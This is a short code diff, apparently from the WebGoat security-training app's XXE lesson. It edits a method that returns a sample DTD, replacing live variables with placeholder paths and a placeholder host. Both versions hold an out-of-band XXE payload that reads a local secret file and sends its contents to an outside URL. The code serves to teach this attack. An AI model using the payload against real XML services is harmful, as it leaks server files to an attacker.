@@ -96,8 +96,8 @@ public class SimpleXXE extends AssignmentEndpoint {
     @ResponseBody
     public String getSampleDTDFile() {
     	return "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" + 
-    			"<!ENTITY % file SYSTEM \"file:"+webGoatHomeDirectory+"XXE/secret.txt\">\n" + 
-    			"<!ENTITY % all \"<!ENTITY send SYSTEM '"+webWolfURL+"?text=%file;'>\">\n" + 
+    			"<!ENTITY % file SYSTEM \"file:replace-this-by-webgoat-temp-directory/XXE/secret.txt\">\n" + 
+    			"<!ENTITY % all \"<!ENTITY send SYSTEM 'http://replace-this-by-webwolf-base-url/landing?text=%file;'>\">\n" + 
     			"%all;";
     }
     
